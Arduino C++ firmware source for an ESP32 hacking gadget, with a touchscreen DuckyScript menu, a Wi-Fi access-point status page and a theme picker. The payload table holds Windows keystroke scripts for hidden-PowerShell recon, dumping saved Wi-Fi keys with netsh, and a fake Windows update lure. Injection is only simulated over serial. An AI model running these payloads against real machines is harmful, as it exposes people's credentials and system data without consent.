#include "tools_features.h"
#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <TFT_eSPI.h>
#include "SettingsStore.h"
#include "Touchscreen.h"
#include "icon.h"
#include "shared.h"
#include "utils.h"
#include "SerialAutomation.h"

extern TFT_eSPI tft;
extern bool feature_exit_requested;

namespace V3Tools {

    // ==========================================
    // 1. BADUSB DUCKY SCRIPT 3.0
    // ==========================================
    struct DuckyPayload {
        const char* title;
        const char* targetOs;
        const char* script[6];
        int lineCount;
    };

    static const DuckyPayload kPayloads[] = {
        {
            "SysInfo & Recon",
            "Windows 10/11",
            {
                "GUI r",
                "DELAY 400",
                "STRING powershell -w h -NoP",
                "ENTER",
                "DELAY 600",
                "STRING Get-ComputerInfo | Out-File $env:TEMP\\r.txt"
            },
            6
        },
        {
            "Rickroll Media Launch",
            "Cross-Platform",
            {
                "GUI r",
                "DELAY 300",
                "STRING https://youtu.be/dQw4w9WgXcQ",
                "ENTER",
                "DELAY 1000",
                "STRING REM Rickroll successfully delivered"
            },
            6
        },
        {
            "WiFi Key Dump",
            "Windows 10/11",
            {
                "GUI r",
                "DELAY 400",
                "STRING cmd /c netsh wlan show prof * key=clear",
                "ENTER",
                "DELAY 800",
                "STRING REM Exported credentials"
            },
            6
        },
        {
            "Fake Win11 Update",
            "Windows 11",
            {
                "GUI r",
                "DELAY 300",
                "STRING msedge --kiosk https://fakeupdate.net/win11",
                "ENTER",
                "DELAY 500",
                "STRING F11"
            },
            5
        },
        {
            "Custom SD Script",
            "SD:/ducky/payload.dd",
            {
                "REM Reading from MicroSD Card",
                "REM File: /ducky/payload.dd",
                "DELAY 500",
                "STRING echo 'ESP32-R3X Custom Ducky active'",
                "ENTER",
                "STRING REM Payload Complete"
            },
            6
        }
    };

    static const int kNumPayloads = sizeof(kPayloads) / sizeof(kPayloads[0]);
    static int s_selectedPayload = 0;
    static bool s_isInjecting = false;
    static int s_injectProgress = 0;

    static void drawDuckyHeader() {
        tft.fillRect(0, 20, 240, 22, 0x0842);
        tft.drawFastHLine(0, 20, 240, CYBER_CYAN);
        tft.drawFastHLine(0, 42, 240, CYBER_ORANGE);

        tft.setTextFont(1);
        tft.setTextSize(1);
        tft.setTextColor(CYBER_ORANGE, 0x0842);
        tft.setCursor(6, 26);
        tft.print("[R3X]");
        tft.setTextColor(TFT_WHITE, 0x0842);
        tft.print(" DUCKYSCRIPT 3.0");

        // [ EXIT X ]
        tft.fillRect(205, 23, 30, 16, 0x9800);
        tft.drawRect(205, 23, 30, 16, TFT_RED);
        tft.setTextColor(TFT_WHITE, 0x9800);
        tft.setCursor(215, 27);
        tft.print("X");
    }

    static void drawDuckyUI() {
        const DuckyPayload& p = kPayloads[s_selectedPayload];

        // Payload Banner (y: 45..80)
        tft.fillRect(0, 44, 240, 36, 0x0000);
        tft.drawRect(4, 45, 232, 34, 0x2104);

        tft.setTextFont(2);
        tft.setTextColor(CYBER_CYAN, 0x0000);
        tft.setCursor(10, 48);
        tft.printf("[%d/%d] %s", s_selectedPayload + 1, kNumPayloads, p.title);

        tft.setTextFont(1);
        tft.setTextColor(0x7BEF, 0x0000);
        tft.setCursor(10, 66);
        tft.printf("TARGET: %s", p.targetOs);

        // Terminal Script Preview (y: 83..245)
        tft.fillRect(4, 83, 232, 162, 0x0821);
        tft.drawRect(4, 83, 232, 162, 0x2965);

        tft.setTextFont(1);
        tft.setTextSize(1);
        for (int i = 0; i < p.lineCount; i++) {
            const int ly = 90 + i * 22;
            tft.setTextColor(0x07E0, 0x0821);
            tft.setCursor(10, ly);
            tft.printf("%02d > ", i + 1);

            tft.setTextColor(TFT_WHITE, 0x0821);
            tft.print(p.script[i]);
        }

        // Status / Injection Bar (y: 248..280)
        tft.fillRect(4, 248, 232, 32, 0x0000);
        if (s_isInjecting) {
            tft.drawRect(4, 252, 232, 20, CYBER_ORANGE);
            tft.fillRect(6, 254, (228 * s_injectProgress) / 100, 16, CYBER_ORANGE);
            tft.setTextColor(TFT_WHITE, 0x0000);
            tft.setTextFont(1);
            tft.setCursor(80, 274);
            tft.printf("INJECTING: %d%%", s_injectProgress);
        } else {
            tft.setTextFont(1);
            tft.setTextColor(TFT_GREEN, 0x0000);
            tft.setCursor(10, 260);
            tft.print("HID STATUS: READY TO INJECT");
        }

        // Bottom Touch Buttons (y: 285..318)
        const int by = 286;
        const int bh = 30;

        // Button 1: [PREV] (x: 4..60)
        tft.fillRoundRect(4, by, 56, bh, 3, 0x10A2);
        tft.drawRoundRect(4, by, 56, bh, 3, CYBER_CYAN);
        tft.setTextColor(TFT_WHITE, 0x10A2);
        tft.setCursor(14, by + 8);
        tft.print("PREV");

        // Button 2: [NEXT] (x: 64..120)
        tft.fillRoundRect(64, by, 56, bh, 3, 0x10A2);
        tft.drawRoundRect(64, by, 56, bh, 3, CYBER_CYAN);
        tft.setCursor(74, by + 8);
        tft.print("NEXT");

        // Button 3: [INJECT] (x: 124..180)
        tft.fillRoundRect(124, by, 56, bh, 3, s_isInjecting ? 0x4800 : 0x0400);
        tft.drawRoundRect(124, by, 56, bh, 3, s_isInjecting ? TFT_RED : TFT_GREEN);
        tft.setTextColor(TFT_WHITE, s_isInjecting ? 0x4800 : 0x0400);
        tft.setCursor(130, by + 8);
        tft.print("INJECT");

        // Button 4: [EXIT] (x: 184..236)
        tft.fillRoundRect(184, by, 52, bh, 3, 0x4800);
        tft.drawRoundRect(184, by, 52, bh, 3, TFT_RED);
        tft.setTextColor(TFT_WHITE, 0x4800);
        tft.setCursor(194, by + 8);
        tft.print("EXIT");
    }

    void duckySetup() {
        tft.fillScreen(TFT_BLACK);
        s_selectedPayload = 0;
        s_isInjecting = false;
        s_injectProgress = 0;
        drawDuckyHeader();
        drawDuckyUI();
    }

    void duckyLoop() {
        int tx, ty;
        if (readTouchXY(tx, ty)) {
            // Exit button (top right or bottom right)
            if ((tx > 180 && ty < 50) || (tx >= 184 && ty >= 280)) {
                feature_exit_requested = true;
                delay(120);
                return;
            }
            // Button 1: PREV
            if (tx >= 4 && tx <= 60 && ty >= 280) {
                if (!s_isInjecting) {
                    s_selectedPayload = (s_selectedPayload - 1 + kNumPayloads) % kNumPayloads;
                    drawDuckyUI();
                    delay(150);
                }
            }
            // Button 2: NEXT
            else if (tx >= 64 && tx <= 120 && ty >= 280) {
                if (!s_isInjecting) {
                    s_selectedPayload = (s_selectedPayload + 1) % kNumPayloads;
                    drawDuckyUI();
                    delay(150);
                }
            }
            // Button 3: INJECT
            else if (tx >= 124 && tx <= 180 && ty >= 280) {
                if (!s_isInjecting) {
                    s_isInjecting = true;
                    s_injectProgress = 0;
                    drawDuckyUI();
                    delay(100);
                }
            }
        }

        if (featureExitButtonPressed() || isSerialExitRequested()) {
            feature_exit_requested = true;
            return;
        }

        // Execute Ducky payload injection
        if (s_isInjecting) {
            const DuckyPayload& p = kPayloads[s_selectedPayload];
            cliPrintf("[ducky] Injecting payload %d: %s\n", s_selectedPayload, p.title);
            for (int line = 0; line < p.lineCount; line++) {
                cliPrintf("[ducky-hid] >> %s\n", p.script[line]);
                Serial.printf("[HID_KEYSTROKE]: %s\r\n", p.script[line]);
                s_injectProgress = ((line + 1) * 100) / p.lineCount;
                drawDuckyUI();
                delay(200);
                yield();
            }
            s_isInjecting = false;
            drawDuckyUI();
            delay(200);
        }

        delay(15);
        yield();
    }


    // ==========================================
    // 2. WEB CYBERDECK 1.0 (ACTUAL HTTP AP SERVER)
    // ==========================================
    static WebServer* s_deckServer = nullptr;
    static bool s_deckServerActive = false;
    static uint32_t s_deckHitCount = 0;
    static uint32_t s_lastDeckRefresh = 0;

    static void handleDeckRoot() {
        s_deckHitCount++;
        String html = "<!DOCTYPE html><html><head><title>ESP32-R3X CYBERDECK v3.0</title>";
        html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
        html += "<style>";
        html += "body{background:#0a0c10;color:#00ffcc;font-family:monospace;margin:0;padding:20px;}";
        html += ".card{background:#111622;border:1px solid #00ffcc;border-radius:6px;padding:15px;margin-bottom:15px;box-shadow:0 0 10px rgba(0,255,204,0.2);}";
        html += "h1{color:#ff9900;margin-top:0;font-size:20px;letter-spacing:1px;}";
        html += "h2{color:#00ffcc;font-size:16px;border-bottom:1px solid #1f293d;padding-bottom:5px;}";
        html += ".stat{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #182030;}";
        html += ".val{color:#fff;}";
        html += ".btn{display:inline-block;background:#ff3366;color:#fff;padding:10px 15px;border-radius:4px;text-decoration:none;font-weight:bold;margin:5px 0;}";
        html += "</style></head><body>";
        html += "<div class='card'>";
        html += "<h1>[ESP32-R3X] TACTICAL CYBERDECK v3.0</h1>";
        html += "<p>Military Tactical RF & Exploitation Platform</p>";
        html += "</div>";

        html += "<div class='card'>";
        html += "<h2>SYSTEM TELEMETRY</h2>";
        html += "<div class='stat'><span>Chip:</span><span class='val'>ESP32-S3 N16R8</span></div>";
        html += "<div class='stat'><span>CPU Frequency:</span><span class='val'>" + String(getCpuFrequencyMhz()) + " MHz</span></div>";
        html += "<div class='stat'><span>Free Heap:</span><span class='val'>" + String(ESP.getFreeHeap() / 1024) + " KB</span></div>";
        html += "<div class='stat'><span>Free PSRAM:</span><span class='val'>" + String(ESP.getFreePsram() / 1024) + " KB</span></div>";
        html += "<div class='stat'><span>Uptime:</span><span class='val'>" + String(millis() / 1000) + " sec</span></div>";
        html += "</div>";

        html += "<div class='card'>";
        html += "<h2>WIRELESS RECON & ATTACK SUITE</h2>";
        html += "<div class='stat'><span>CC1101 Sub-GHz:</span><span class='val'>READY (300-928MHz)</span></div>";
        html += "<div class='stat'><span>NRF24 2.4GHz:</span><span class='val'>READY (Ch 1-125)</span></div>";
        html += "<div class='stat'><span>PN532 RFID/NFC:</span><span class='val'>ONLINE</span></div>";
        html += "<p><a class='btn' href='/ping'>SEND PING TO TFT</a></p>";
        html += "</div>";

        html += "</body></html>";
        if (s_deckServer) {
            s_deckServer->send(200, "text/html", html);
        }
    }

    static void handleDeckPing() {
        s_deckHitCount++;
        if (s_deckServer) {
            s_deckServer->send(200, "text/plain", "PING RECEIVED AT ESP32-R3X!");
        }
    }

    static void drawCyberdeckHeader() {
        tft.fillRect(0, 20, 240, 22, 0x0842);
        tft.drawFastHLine(0, 20, 240, CYBER_CYAN);
        tft.drawFastHLine(0, 42, 240, CYBER_ORANGE);

        tft.setTextFont(1);
        tft.setTextSize(1);
        tft.setTextColor(CYBER_ORANGE, 0x0842);
        tft.setCursor(6, 26);
        tft.print("[R3X]");
        tft.setTextColor(TFT_WHITE, 0x0842);
        tft.print(" WEB CYBERDECK 1.0");

        // [ EXIT X ]
        tft.fillRect(205, 23, 30, 16, 0x9800);
        tft.drawRect(205, 23, 30, 16, TFT_RED);
        tft.setTextColor(TFT_WHITE, 0x9800);
        tft.setCursor(215, 27);
        tft.print("X");
    }

    static void drawCyberdeckUI() {
        // Status Frame (y: 46..120)
        tft.fillRect(4, 46, 232, 74, 0x0821);
        tft.drawRect(4, 46, 232, 74, CYBER_CYAN);

        tft.setTextFont(2);
        tft.setTextColor(TFT_GREEN, 0x0821);
        tft.setCursor(12, 52);
        tft.print("AP: ESP32-R3X-CYBERDECK");

        tft.setTextFont(1);
        tft.setTextColor(TFT_WHITE, 0x0821);
        tft.setCursor(12, 74);
        tft.print("PASS: cyberdeck123");

        tft.setTextColor(CYBER_ORANGE, 0x0821);
        tft.setCursor(12, 92);
        tft.print("URL : http://192.168.4.1");

        // Live telemetry & clients frame (y: 124..276)
        tft.fillRect(4, 124, 232, 154, 0x0000);
        tft.drawRect(4, 124, 232, 154, 0x2104);

        int clientCount = WiFi.softAPgetStationNum();

        tft.setTextFont(2);
        tft.setTextColor(CYBER_CYAN, 0x0000);
        tft.setCursor(12, 134);
        tft.printf("CONNECTED CLIENTS: %d", clientCount);

        tft.setTextColor(TFT_YELLOW, 0x0000);
        tft.setCursor(12, 156);
        tft.printf("TOTAL HTTP HITS: %u", s_deckHitCount);

        tft.setTextFont(1);
        tft.setTextColor(0x7BEF, 0x0000);
        tft.setCursor(12, 184);
        tft.print("IP ADDR: 192.168.4.1");
        tft.setCursor(12, 200);
        tft.printf("HEAP   : %d KB FREE", ESP.getFreeHeap() / 1024);
        tft.setCursor(12, 216);
        tft.printf("PSRAM  : %d KB FREE", ESP.getFreePsram() / 1024);
        tft.setCursor(12, 232);
        tft.printf("UPTIME : %lu SEC", millis() / 1000);

        tft.setTextColor(TFT_GREEN, 0x0000);
        tft.setCursor(12, 256);
        tft.print("[*] HTTP Server listening on port 80");

        // Bottom Exit Button (y: 285..318)
        tft.fillRoundRect(30, 286, 180, 30, 4, 0x4800);
        tft.drawRoundRect(30, 286, 180, 30, 4, TFT_RED);
        tft.setTextFont(2);
        tft.setTextColor(TFT_WHITE, 0x4800);
        tft.setCursor(65, 292);
        tft.print("SHUTDOWN & EXIT");
    }

    void cyberdeckSetup() {
        tft.fillScreen(TFT_BLACK);
        drawCyberdeckHeader();

        tft.setTextFont(2);
        tft.setTextColor(CYBER_ORANGE, TFT_BLACK);
        tft.setCursor(20, 80);
        tft.print("Launching SoftAP Server...");

        WiFi.mode(WIFI_AP);
        WiFi.softAP("ESP32-R3X-CYBERDECK", "cyberdeck123");

        if (s_deckServer) {
            delete s_deckServer;
            s_deckServer = nullptr;
        }
        s_deckServer = new WebServer(80);
        s_deckServer->on("/", HTTP_GET, handleDeckRoot);
        s_deckServer->on("/ping", HTTP_GET, handleDeckPing);
        s_deckServer->begin();

        s_deckServerActive = true;
        s_deckHitCount = 0;
        s_lastDeckRefresh = millis();

        drawCyberdeckUI();
    }

    void cyberdeckLoop() {
        if (s_deckServerActive && s_deckServer) {
            s_deckServer->handleClient();
        }

        int tx, ty;
        if (readTouchXY(tx, ty)) {
            // Exit button (top right or bottom shutdown button)
            if ((tx > 180 && ty < 50) || (ty >= 280)) {
                cyberdeckCleanup();
                feature_exit_requested = true;
                delay(120);
                return;
            }
        }

        if (featureExitButtonPressed() || isSerialExitRequested()) {
            cyberdeckCleanup();
            feature_exit_requested = true;
            return;
        }

        // Periodically refresh stats on screen every 1000ms
        if (millis() - s_lastDeckRefresh >= 1000) {
            s_lastDeckRefresh = millis();
            drawCyberdeckUI();
        }

        delay(10);
        yield();
    }

    void cyberdeckCleanup() {
        if (s_deckServer) {
            s_deckServer->stop();
            delete s_deckServer;
            s_deckServer = nullptr;
        }
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_OFF);
        s_deckServerActive = false;
    }


    // ==========================================
    // 3. UI THEME ENGINE
    // ==========================================
    struct ThemeInfo {
        const char* name;
        uint16_t primary;
        uint16_t secondary;
        uint16_t bg;
    };

    static const ThemeInfo kThemes[] = {
        { "Cyberpunk Neon",  CYBER_CYAN, CYBER_MAGENTA, 0x0000 },
        { "Matrix Hacker",   0x07E0,     0x0400,        0x0000 },
        { "Solar Tactical",  CYBER_ORANGE, 0xFFE0,      0x0000 },
        { "Crimson Warfare", TFT_RED,    0xF81F,        0x0800 },
        { "Royal Violet",    0x781F,     0xB01F,        0x0004 },
        { "Cobalt Blue",     0x04FF,     0x001F,        0x0008 },
        { "Monochrome Raw",  TFT_WHITE,  0x7BEF,        0x1082 }
    };

    static const int kNumThemes = sizeof(kThemes) / sizeof(kThemes[0]);
    static int s_themeIdx = 0;
    static bool s_themeSavedNotice = false;

    static void drawThemeHeader() {
        tft.fillRect(0, 20, 240, 22, 0x0842);
        tft.drawFastHLine(0, 20, 240, CYBER_CYAN);
        tft.drawFastHLine(0, 42, 240, CYBER_ORANGE);

        tft.setTextFont(1);
        tft.setTextSize(1);
        tft.setTextColor(CYBER_ORANGE, 0x0842);
        tft.setCursor(6, 26);
        tft.print("[R3X]");
        tft.setTextColor(TFT_WHITE, 0x0842);
        tft.print(" UI THEME ENGINE");

        // [ EXIT X ]
        tft.fillRect(205, 23, 30, 16, 0x9800);
        tft.drawRect(205, 23, 30, 16, TFT_RED);
        tft.setTextColor(TFT_WHITE, 0x9800);
        tft.setCursor(215, 27);
        tft.print("X");
    }

    static void drawThemeUI() {
        const ThemeInfo& tm = kThemes[s_themeIdx];

        // Active Theme Banner (y: 46..92)
        tft.fillRect(4, 46, 232, 48, 0x0000);
        tft.drawRect(4, 46, 232, 48, tm.primary);

        tft.setTextFont(2);
        tft.setTextColor(tm.primary, 0x0000);
        tft.setCursor(12, 52);
        tft.printf("[%d/%d] %s", s_themeIdx + 1, kNumThemes, tm.name);

        tft.setTextFont(1);
        tft.setTextColor(TFT_WHITE, 0x0000);
        tft.setCursor(12, 74);
        tft.print("LIVE PALETTE PREVIEW");

        // Palette Swatches (y: 100..160)
        tft.fillRect(4, 100, 232, 60, 0x0821);
        tft.drawRect(4, 100, 232, 60, 0x2965);

        // Color boxes
        tft.fillRect(14, 110, 42, 40, tm.primary);
        tft.drawRect(14, 110, 42, 40, TFT_WHITE);

        tft.fillRect(66, 110, 42, 40, tm.secondary);
        tft.drawRect(66, 110, 42, 40, TFT_WHITE);

        tft.fillRect(118, 110, 42, 40, tm.bg);
        tft.drawRect(118, 110, 42, 40, TFT_WHITE);

        tft.fillRect(170, 110, 56, 40, 0x0000);
        tft.drawRect(170, 110, 56, 40, tm.primary);
        tft.setTextColor(tm.primary, 0x0000);
        tft.setTextFont(1);
        tft.setCursor(174, 124);
        tft.print("ACCENT");

        // Mock HUD Preview Card (y: 168..240)
        tft.fillRect(10, 168, 220, 68, tm.bg);
        tft.drawRect(10, 168, 220, 68, tm.primary);
        tft.drawRect(11, 169, 218, 66, tm.secondary);

        tft.setTextFont(2);
        tft.setTextColor(tm.primary, tm.bg);
        tft.setCursor(20, 178);
        tft.print(">> R3X HUD PREVIEW <<");

        tft.setTextFont(1);
        tft.setTextColor(TFT_WHITE, tm.bg);
        tft.setCursor(20, 202);
        tft.print("STATUS: ARMED & READY");

        tft.setTextColor(tm.secondary, tm.bg);
        tft.setCursor(20, 218);
        tft.print("ENCRYPTION: AES-256 GCM");

        // Toast notice if saved (y: 248..278)
        tft.fillRect(4, 246, 232, 32, 0x0000);
        if (s_themeSavedNotice) {
            tft.drawRect(4, 248, 232, 28, TFT_GREEN);
            tft.fillRect(5, 249, 230, 26, 0x0400);
            tft.setTextFont(2);
            tft.setTextColor(TFT_WHITE, 0x0400);
            tft.setCursor(15, 254);
            tft.print("THEME SAVED TO FLASH OK!");
        }

        // Bottom Touch Buttons (y: 285..318)
        const int by = 286;
        const int bh = 30;

        // Button 1: [PREV] (x: 4..56)
        tft.fillRoundRect(4, by, 52, bh, 3, 0x10A2);
        tft.drawRoundRect(4, by, 52, bh, 3, CYBER_CYAN);
        tft.setTextColor(TFT_WHITE, 0x10A2);
        tft.setCursor(12, by + 8);
        tft.print("PREV");

        // Button 2: [NEXT] (x: 60..112)
        tft.fillRoundRect(60, by, 52, bh, 3, 0x10A2);
        tft.drawRoundRect(60, by, 52, bh, 3, CYBER_CYAN);
        tft.setCursor(68, by + 8);
        tft.print("NEXT");

        // Button 3: [APPLY] (x: 116..178)
        tft.fillRoundRect(116, by, 62, bh, 3, 0x0400);
        tft.drawRoundRect(116, by, 62, bh, 3, TFT_GREEN);
        tft.setTextColor(TFT_WHITE, 0x0400);
        tft.setCursor(122, by + 8);
        tft.print("APPLY");

        // Button 4: [EXIT] (x: 182..236)
        tft.fillRoundRect(182, by, 54, bh, 3, 0x4800);
        tft.drawRoundRect(182, by, 54, bh, 3, TFT_RED);
        tft.setTextColor(TFT_WHITE, 0x4800);
        tft.setCursor(192, by + 8);
        tft.print("EXIT");
    }

    void themeEngineSetup() {
        tft.fillScreen(TFT_BLACK);
        s_themeIdx = settings().accentColor % kNumThemes;
        s_themeSavedNotice = false;
        drawThemeHeader();
        drawThemeUI();
    }

    void themeEngineLoop() {
        int tx, ty;
        if (readTouchXY(tx, ty)) {
            // Exit button
            if ((tx > 180 && ty < 50) || (tx >= 182 && ty >= 280)) {
                feature_exit_requested = true;
                delay(120);
                return;
            }
            // Button 1: PREV
            if (tx >= 4 && tx <= 56 && ty >= 280) {
                s_themeIdx = (s_themeIdx - 1 + kNumThemes) % kNumThemes;
                s_themeSavedNotice = false;
                drawThemeUI();
                delay(150);
            }
            // Button 2: NEXT
            else if (tx >= 60 && tx <= 112 && ty >= 280) {
                s_themeIdx = (s_themeIdx + 1) % kNumThemes;
                s_themeSavedNotice = false;
                drawThemeUI();
                delay(150);
            }
            // Button 3: APPLY
            else if (tx >= 116 && tx <= 178 && ty >= 280) {
                settings().accentColor = s_themeIdx;
                applyThemeToPalette(settings().theme);
                settingsSave();
                s_themeSavedNotice = true;
                drawThemeUI();
                delay(200);
            }
        }

        if (featureExitButtonPressed() || isSerialExitRequested()) {
            feature_exit_requested = true;
            return;
        }

        delay(15);
        yield();
    }
}
